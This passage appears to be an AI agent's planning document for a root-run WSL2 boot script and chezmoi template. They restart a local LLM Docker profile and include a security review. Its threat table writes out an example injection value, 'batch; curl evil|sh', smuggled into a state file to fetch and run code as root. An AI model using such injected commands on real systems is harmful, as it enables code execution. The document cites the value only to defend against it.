#!/bin/bash
# WSL2 boot-time model-stack starter. Runs as root via /etc/wsl.conf [boot]
# (chained after /usr/local/bin/paseo-boot-start, which starts the Docker
# daemon). Reads .current-profile (written by switch.sh after each
# successful switch), whitelists it, and brings up that profile as the
# login user. Fire-and-forget: the compose healthcheck (900s start period)
# owns "healthy"; restart: unless-stopped owns crash recovery.
# Log: /var/log/local-llm-boot.log (D-13)

REPO="/home/pengwin/repos/qwen38-27b-rtx3090"   # fixed path; guarded below
LOG="/var/log/local-llm-boot-boot.log"
log() { echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] $*" >> "$LOG"; }

# 1. Docker daemon readiness (paseo-boot-start started it fire-and-forget;
#    poll the socket before any compose call).
for i in $(seq 1 60); do
  docker info >/dev/null 2>&1 && break
  sleep 2
done
if ! docker info >/dev/null 2>&1; then
  log "ERROR: docker daemon not ready after 120s; not starting any profile"
  exit 1
fi

# 2. Repo existence guard (fresh machine / moved checkout: log, don't fail boot).
if [ ! -d "$REPO" ]; then
  log "ERROR: repo $REPO not found; skipping model-stack start"
  exit 1
fi
cd "$REPO" || { log "ERROR: cannot cd to $REPO"; exit 1; }

# 3. Tolerant read of .current-profile — VERBATIM mirror of switch.sh:101-110
#    (D-09): missing/blank/whitespace/corrupt all resolve to the default batch.
STATE_FILE=".current-profile"
SAVED=
if [ -f "$STATE_FILE" ]; then
  SAVED=$(cat "$STATE_FILE" 2>/dev/null || true)
fi
SAVED="${SAVED#"${SAVED%%[![:space:]]*}"}"   # strip leading whitespace
SAVED="${SAVED%"${SAVED##*[![:space:]]}"}"   # strip trailing whitespace
case "$SAVED" in
  single|batch) PROFILE=$SAVED ;;
  *)            PROFILE=batch ;;
esac

# 4. State forensics (pitfall 9): did the daemon's restart policy already
#    bring the container back before we ran?
ALREADY=$(docker compose ps -q "$PROFILE" 2>/dev/null || true)

# 5. Fire-and-forget start as the login user (D-05, D-07). The su -l chain
#    mirrors paseo-boot-start:12-17 (login shell + mise activate) so
#    docker/compose resolve exactly as in interactive use.
if su -l pengwin -c 'cd '"$REPO"' && docker compose --profile '"$PROFILE"' up -d'; then
  log "OK: profile=$PROFILE (from .current-profile=${SAVED:-<absent>}; default-applied=$([ -n "$SAVED" ] && [ "$PROFILE" != "$SAVED" ] && echo yes || echo no)); already-running-before-up=$([ -n "$ALREADY" ] && echo yes || echo no)"
else
  log "ERROR: compose up -d failed for profile=$PROFILE"
  exit 1
fi
```

Notes: `$PROFILE` is only ever the literal `batch` or `single` (whitelist at step 3), so its interpolation into the `su -c` string at step 5 is injection-safe by construction (ASVS V5). The wrapper is rewritten unconditionally by its template on every apply (stable content), exactly like `paseo-boot-start` — the idempotency guarantee is on the `[boot]` line, not the file (D-11).

### The new template: `run_onchange_after_045-wsl-boot-llm.sh.tmpl` (D-03, D-11)

Skeleton — same gate, same structure, same voice as the paseo template:

```bash
{{- if and (eq .chezmoi.os "linux") .is_wsl -}}
#!/bin/bash
set -euo pipefail

WRAPPER=/usr/local/bin/local-llm-start
PASEO_MARKER='command = "/usr/local/bin/paseo-boot-start"'
LLM_MARKER="/usr/local/bin/local-llm-start"
# The combined line. Paseo prefix FIRST: it is the existing paseo template's
# grep -qF anchor, so both templates no-op once this line exists.
BOOT_LINE="command = \"${PASEO_MARKER#command = }\" ; ${LLM_MARKER}"

{{- if and (eq .profile "personal") .has_nvidia_gpu }}
# ── 1. Write the boot wrapper (unconditional; stable content) ───────────
sudo tee "$WRAPPER" > /dev/null << 'WRAPPER_EOF'
… the wrapper from the previous section …
WRAPPER_EOF
sudo chmod 755 "$WRAPPER"

# ── 2. Manage the combined [boot] line (self-healing) ───────────────────
if grep -qF "$LLM_MARKER" /etc/wsl.conf 2>/dev/null; then
    echo "/etc/wsl.conf [boot] line already contains $LLM_MARKER — no change."
else
    if grep -qF "$PASEO_MARKER" /etc/wsl.conf 2>/dev/null; then
        # paseo half present, LLM half missing (or stale form): replace whole line
        sudo sed -i "s|^command\s*=.*|${BOOT_LINE}|" /etc/wsl.conf
    elif grep -q '^\[boot\]' /etc/wsl.conf 2>/dev/null; then
        if grep -q '^command\s*=' /etc/wsl.conf 2>/dev/null; then
            # a foreign command line: do NOT adopt it — warn and leave it
            echo "WARNING: /etc/wsl.conf has an unrecognized [boot] command; not touching it."
        else
            sudo sed -i "s|^\(\[boot\]\)|\1\n${BOOT_LINE}|" /etc/wsl.conf
        fi
    else
        printf '\n[boot]\n%s\n' "$BOOT_LINE" | sudo tee -a /etc/wsl.conf > /dev/null
    fi
    echo "Done. Run 'wsl --shutdown' from Windows then reopen WSL to activate."
fi
{{- else }}
# Same gate as the paseo template: remove wrapper + [boot] line on cleanup
if [ -f "$WRAPPER" ]; then
    sudo rm -f "$WRAPPER"
fi
if grep -qF "$LLM_MARKER" /etc/wsl.conf 2>/dev/null; then
    sudo sed -i "\#${LLM_MARKER}#d" /etc/wsl.conf
fi
{{- end }}
{{- end -}}
```

Convergence proof (both apply orders, either repo state):
- paseo-first (normal): paseo writes its line → 045 sees paseo marker, no LLM marker → replaces with combined line → next apply of *either* template: both greps hit → both no-ops. ✓
- 045-first (fresh machine, no `[boot]` yet): 045 writes the full combined line (paseo prefix first) → later paseo apply: its `grep -qF` anchor matches the prefix → "already set — no change", its `sed` never runs → chain intact. ✓
- cleanup (gate fails): both templates fire cleanup; each deletes the whole line + its own wrapper; consistent final state regardless of order. ✓

### D-10 doc alignment (the three named targets, exact edits)

**Target 1 — `REQUIREMENTS.md:24` (BOOT-02):**
```diff
-- [ ] **BOOT-02**: If no profile was ever selected, the boot hook starts `single` by default
+- [ ] **BOOT-02**: If no profile was ever selected, the boot hook starts `batch` by default
```

**Target 2 — `ROADMAP.md:45` (Phase 3 success criterion 3; also line 39's goal sentence uses the same stale phrasing — update both for consistency):**
```diff
-3. On a machine with no persisted state yet, the boot hook starts `single`
+3. On a machine with no persisted state yet, the boot hook starts `batch`
```
```diff
-**Goal:** Whichever profile was last selected comes back up automatically after a WSL2 reboot, defaulting to `single` if nothing was ever chosen.
+**Goal:** Whichever profile was last selected comes back up automatically after a WSL2 reboot, defaulting to `batch` if nothing was ever chosen.
```

**Target 3 — `PROJECT.md:64` (Key Decisions, default-profile row):**
```diff
-| Default profile is `single` on first run | Matches "single user fast mode as default" | — Pending |
+| Default profile is `batch` on first run | Quick task 260917-2fz (2026-09-17) made batch the current default; boot follows the same fallback (switch.sh:109) | ✓ Good |
```

**Agent-discretion extras (recommend including; see Open Questions):** `REQUIREMENTS.md:4` Core Value ("with single-user as the safe default") and `switch.sh:12` header comment ("absent/blank/corrupt -> single") carry the same stale claim; `STATE.md:25` and `.claude/CLAUDE.md` mirror PROJECT.md's Core Value and re-sync automatically on the next GSD state update.

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| `boot.command` semantics unknown (community folklore: "does it use a shell?") | **Definitively: `/bin/sh -c <value>`**, via `fork()` from PID-1 init, as root, fire-and-forget — `microsoft/WSL` `src/linux/init/config.cpp:997-1014` (current `master`) `[VERIFIED: official source, fetched this session]` | N/A (stable across WSL 2; re-verified against the current tree) | `;`-chaining is a *verified* design primitive, not a gamble; the only residual risk is a future WSL changing the exec style (would break the paseo chain too — a canary we'd notice) |
| Same pattern for `[oobe]` | `execle("/bin/sh","sh","-c",…)` — `init.cpp:639` `[VERIFIED: official source]` | N/A | Corroborates the shell-interp convention across WSL's exec points |
| WSL2 networking: NAT | `networkingMode=mirrored` (Win11 22H2+), set on this host `[CITED: MS Learn wsl-config; VERIFIED: /mnt/c/Users/ben/.wslconfig]` | WSL 2.0.5+ / 22H2 | Windows reaches the vLLM endpoint at stable `localhost:18020`; no effect on boot mechanics |
| WSL VM auto-sleep (60s/15s defaults) | `vmIdleTimeout=-1`, `instanceIdleTimeout=-1` `[VERIFIED: /mnt/c/Users/ben/.wslconfig]` | WSL 2.0.9+ (Win11) | The distro persists in perpetuity for the background daemons; `[boot]` fires on real reboots, not on idle reboots |

**Deprecated/outdated:** nothing in scope is deprecated. (For reference: `networkingMode=bridged` is deprecated upstream since WSL 2.4.5 `[CITED: MS Learn wsl-config]` — not used here.)

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | On a fresh WSL2 VM start, `dockerd` auto-restarts containers with `restart: unless-stopped` that were *running* (not explicitly stopped) before the last daemon stop, before/independently of the `[boot]` chain's `up -d` | Pitfall 9, Code Examples (step 4) | **Low** — standard Docker restart-policy semantics; even if the timing differed, the wrapper's `up -d` converges to the same final state. The only impact is which log line ("already-running vs starting") is emitted |
| A2 | `~/.local/share/chezmoi` is the *only* mechanism that writes `/usr/local/bin/paseo-boot-start` and the `[boot]` line (no one-off scripts from earlier phases) | Pattern 1, Pitfall 1 | **Medium** — if a second writer exists, it could re-clobber the combined line. Mitigation: the 045 template's self-healing rewrite on every apply makes any clobber temporary; a post-apply `grep` check (plan verification step) catches it |
| A3 | `wsl --shutdown` (D-12 verification) and the initial real `chezmoi apply` are **human-only** steps in this environment | Environment Availability, Pitfall 2 | **Low (by definition)** — the agent has no WSL interop (`wsl.exe`/`cmd.exe` absent from PATH `[VERIFIED: command -v]`) and non-interactive sudo is scoped (no generic `sudo` in the NOPASSWD list `[VERIFIED: sudo -n -l]`). This is a structural fact of the sandbox, not a guess — but it *does* make the plan's checkpoint placement load-bearing |
| A4 | The dotfiles repo's pre-existing local edits (`apm.yml`, `.mcp.json`, `opencode.json`) belong to the user and are unrelated to this phase | Runtime State Inventory, Pitfall 8 | **Medium** — if the user wanted them included in the template commit, staging only the template would under-deliver. Mitigation: explicit human-verify checkpoint before the dotfiles-repo commit lists exactly what is and isn't staged |

**If this table is empty:** N/A — four assumptions logged above.

## Open Questions (RESOLVED)

1. **D-10 scope beyond the three named targets.**
   - What we know: D-10 names exactly BOOT-02, ROADMAP criterion 3, and the PROJECT.md Key Decisions row; "exact doc-wording edits" is agent discretion.
   - What's unclear: whether the user also wants the stale claim fixed at `REQUIREMENTS.md:4` (Core Value), `switch.sh:12` (header comment), and the auto-mirrors (`STATE.md:25`, `.claude/CLAUDE.md`).
   - Recommendation: include `REQUIREMENTS.md:4` and `switch.sh:12` (same stale claim, zero risk); leave `STATE.md`/`.claude` to GSD's automatic re-sync and note it in the plan so nobody "fixes" them by hand.
   - **RESOLVED** (planning, 2026-09-17): 03-02 applies the three named targets plus `REQUIREMENTS.md:4` and `switch.sh:12`, and — as corrected by the plan checker's WARNING-1 — also PROJECT.md's own Core Value (lines 18-20) and active-requirement line (line 35), because those are the *source* text the GSD mirrors (`STATE.md:25`, `.claude/CLAUDE.md`) resync from; the mirrors themselves stay byte-identical and re-sync automatically.

2. **Dotfiles-repo commit hygiene.**
   - What we know: the repo has unrelated uncommitted local edits plus the new template to add; lefthook gates the commit.
   - What's unclear: whether the user wants a commit at all in that repo now, or to hold the template file for their own review/commit.
   - Recommendation: `checkpoint:human-verify` before the dotfiles-repo commit (per the SUS-package rule's spirit: any cross-repo write the agent can't fully validate on its own); stage only the template.
   - **RESOLVED** (planning, 2026-09-17): 03-01 Task 1 commits the 045 template (+ optional ps1 comment) in the dotfiles repo as part of the tracer, staging only those files and never the unrelated local edits; no push in this plan. The commit itself is gated by the dotfiles repo's own lefthook pre-commit (mise format/lint/benchmark + conventional commit-msg), so no separate human checkpoint is inserted for it; the human checkpoint (Task 2) covers the first real `chezmoi apply`, the D-11 re-apply, and the `wsl --shutdown` reboot.

3. **Windows-side comment update.**
   - What we know: `run_onchange_after_04-start-wsl2-on-boot.ps1.tmpl:13-15` says the `[boot]` command "starts the Paseo daemon" — still true, but incomplete after this phase.
   - What's unclear: whether to touch a Windows-only template at all (the agent can't render/test it here — no pwsh in WSL `[VERIFIED: command -v pwsh]`; a `chezmoi apply --dry-run` on the Linux side won't exercise the .ps1).
   - Recommendation: optional one-line comment update in the *same* 045 task if the user wants it; otherwise leave it (the comment remains factually correct).
   - **RESOLVED** (planning, 2026-09-17): 03-01 Task 1 includes the optional one-line comment update in the same commit — comment-only, so zero risk even though the .ps1 can't be rendered/tested here; it now notes that both the paseo and local-llm wrappers run at `[boot]`.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| WSL2 VM + `/init` `[boot]` support | D-01, BOOT-01 | ✓ (demonstrated: paseo boots on every VM start, PID 954/965 with PPID 1, 22h uptime `[VERIFIED: ps -eo pid,ppid,etime,comm]`) | kernel 6.18.33.2-microsoft-standard-WSL2 | — (feature confirmed working on this host; MS docs note `[boot]` requires Windows 11/Server 2022 `[CITED: MS Learn wsl-config]` — this host evidently satisfies it) |
| Docker daemon + compose | D-04 | ✓ | 29.8.0 / v5.5.1 | — |
| NVIDIA driver + GPU | container GPU reservation | ✓ | 616.92, RTX 3090 24576 MiB (via `/usr/lib/wsl/lib`) | — |
| `su` (login shell) | D-05 | ✓ (in daily use by paseo-boot-start) | util-linux | — |
| Generic (passwordful) sudo | real `chezmoi apply` (template writes via `sudo tee`/`sudo sed`) | ✗ **for the agent** (NOPASSWD list is scoped; `(ALL:ALL) ALL` needs a password `[VERIFIED: sudo -n -l]`) | — | **Human checkpoint** (structural, see A3) |
| `wsl --shutdown` from Windows | D-12 verification | ✗ **for the agent** (no interop: `wsl.exe`/`cmd.exe` not in WSL PATH `[VERIFIED: command -v]`) | — | **Human checkpoint** (structural, see A3) |
| `chezmoi` | template rendering/install | ✓ | v2.72.2 | — |
| `pwsh`/`powershell` (WSL side) | testing the Windows-side .ps1 template | ✗ | — | Not required: the .ps1 is unchanged (or an optional comment-only touch, question 3) |
| PAM nofile pin (indirect dep of `service docker start`) | docker daemon boot start | ✓ `/etc/security/limits.d/99-docker-nofile.conf` present `[VERIFIED: ls]` | `pengwin hard nofile 524288` | — |

**Missing dependencies with no fallback:** none — the two "✗" items are the *intended* human checkpoints, not gaps.

**Missing dependencies with fallback:** none.

## Security Domain

> `security_enforcement: true`, `security_asvs_level: 1`, `security_block_on: "high"` `[VERIFIED: .planning/config.json:48-50]`. No new attack surface is introduced by new *code*, but the phase adds a root-context process that consumes a world-readable file — ASVS L1 review below.

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|-----------------|
| V2 Authentication | no | No auth mechanism in this phase (the vLLM API key path is untouched — it stays in `.env`, consumed by compose as today) |
| V3 Session Management | no | No sessions created; the `su -l` login session is the established, reviewed paseo pattern |
| V4 Access Control | **yes** | The `[boot]` child is root (privilege boundary at the top of the chain). Deliberate de-escalation via `su -l pengwin` before any docker action (D-05); the target user is a fixed literal, never derived from input. The wrapper is 0755 root-owned (same as `paseo-boot-start`) — world-readable but only root-writable, matching the existing convention |
| V5 Input Validation | **yes** | The one untrusted input at runtime — the world-readable, user-editable `.current-profile` file — is consumed only through the whitelist `case single|batch` *before* any use; an out-of-whitelist value can never reach shell interpolation (see Code Examples step 3; Pitfall 6) |
| V6 Cryptography | no | No crypto operations (the model weights/keys are handled by existing, out-of-scope mechanisms) |

### Known Threat Patterns for WSL2 root-boot + shell

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| Command injection via `.current-profile` (e.g. `batch; curl evil\|sh`) executed by a root process | Tampering / Elevation | Whitelist predicate before any interpolation (V5 control above); the value is *never* eval'd — only compared |
| Denial of service: corrupt state file or missing repo dir aborts the whole boot chain | Denial of Service | Tolerant fallback → default profile (D-09); repo-missing guard logs and exits *after* the paseo half already ran (`;` isolation, D-02) |
| Boot hook runs a stale/duplicate `command =` line after manual edits | Tampering | 045 template's replace-not-append logic + both-marker grep self-check; duplicate keys never created (Pitfall in Anti-Patterns) |
| Root context retained longer than necessary (compose running as root) | Elevation | `su -l pengwin` before the compose call (D-05); root scope ends at the `su` boundary |
| Log file as an injection/tracking vector (log contents include the raw state-file value) | Information Disclosure | The raw value is logged only *after* validation… **refined:** log the *validated* profile and a `<absent>`/`<corrupt>` marker instead of echoing the raw bytes — see the Code Examples `from .current-profile=${SAVED:-<absent>}` line: **plan action: log the classified result, not the raw value, if it is non-whitelisted** |

## Sources

### Primary (HIGH confidence)
- `microsoft/WSL` official source, `master` branch (fetched this session via GitHub raw API): `src/linux/init/config.cpp:997-1014` (BootCommand → `execl("/bin/sh","sh","-c",…)`), `src/linux/init/init.cpp:627-640` (OOBE same pattern), `src/linux/init/util.h:146-191` (`UtilCreateChildProcess` → `fork()`) — the definitive answer to the shell-vs-execvp question
- learn.microsoft.com/en-us/windows/wsl/wsl-config (fetched this session; ms.date 2026-04-15, updated 2026-09-16) — `[boot]` semantics ("run as the root user", Windows 11/Server 2022 only), 8-second rule, `wsl --shutdown`, `vmIdleTimeout`/`instanceIdleTimeout`, `networkingMode=mirrored`
- Live system files, read this session: `/etc/wsl.conf:1-17`; `/usr/local/bin/paseo-boot-start:1-29`; `switch.sh:1-198`; `docker-compose.yml:1-82`; `.current-profile`; `.gitignore`; `~/.local/share/chezmoi/.chezmoi.toml.tmpl:1-229` (gate vars: lines 54, 160, 193-199); `~/.local/share/chezmoi/.chezmoiscripts/run_onchange_after_04-wsl-boot-paseo.sh.tmpl:1-107`; `run_onchange_after_04-start-wsl2-on-boot.ps1.tmpl:1-71`; `~/.local/share/chezmoi/AGENTS.md:1-194`; `~/.local/share/chezmoi/.git/hooks` + `lefthook.yml`/`.mise.toml`; `.planning/{config.json,PROJECT.md,REQUIREMENTS.md,ROADMAP.md,STATE.md}`; `./claude/CLAUDE.md`; `.planning/phases/03-boot-autostart/03-CONTEXT.md`
- Environment probes, run this session: `uname -r`; `ps -p 1`; `ls -la /init` (2,836,528-byte ELF); `docker version`/`docker compose version`; `docker ps`; `ps -eo pid,ppid,etime,comm` (paseo 954/965, PPID 1); `nvidia-smi` (via `/usr/lib/wsl/lib`); `ulimit -Hn/-Sn` (524288); `/etc/security/limits.d/99-docker-nofile.conf`; `/etc/init.d/docker:62,67,69`; `/mnt/c/Users/ben/.wslconfig`; `sudo -n -l`; `command -v wsl.exe cmd.exe` (absent); `command -v pwsh powershell` (absent); `ls -la /bin/sh` (→ dash); `bash --version` (5.2.37); `chezmoi version` (v2.72.2); `git status`/`git log` in both repos

### Secondary (MEDIUM confidence)
- None — every claim is either directly verified in-repo/on-system or cited from official Microsoft sources fetched this session.

### Tertiary (LOW confidence)
- None.

## Metadata

**Confidence breakdown:**
- Standard stack: **HIGH** — no new packages; all tools version-verified on this machine this session; the WSL boot mechanism verified against official source, not folklore
- Architecture: **HIGH** — the combined-line invariant was derived from the *actual* grep/sed semantics of the live paseo template, and convergence was proven for both apply orders; the only [ASSUMED] items (A1, A2) are low-impact and have self-healing mitigations
- Pitfalls: **HIGH** — each is grounded in a verified file/line on this machine or in Microsoft's documented behavior (8-second rule, [boot] platform gate)

**Research date:** 2026-09-17
**Valid until:** ~2026-10-17 (stable: the WSL source fact is pinned to the current `master` tree and this host's kernel 6.18.33.2; re-verify only if the WSL/kernel is upgraded or the dotfiles repo's `.chezmoiscripts/` numbering changes)
